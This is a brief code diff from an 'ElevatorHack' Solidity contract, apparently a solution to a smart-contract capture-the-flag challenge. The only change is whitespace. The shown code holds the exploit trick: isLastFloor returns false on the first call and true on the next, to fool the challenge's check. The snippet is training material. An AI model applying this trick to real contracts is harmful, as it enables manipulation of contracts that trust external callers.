@@ -18,7 +18,7 @@ contract ElevatorHack {
         challenge.goTo(0);
     }
 
-    function isLastFloor(uint256 /* floor */) external returns (bool) {
+    function isLastFloor(uint256 /* floor */ ) external returns (bool) {
         timesCalled++;
         if (timesCalled > 1) return true;
         else return false;
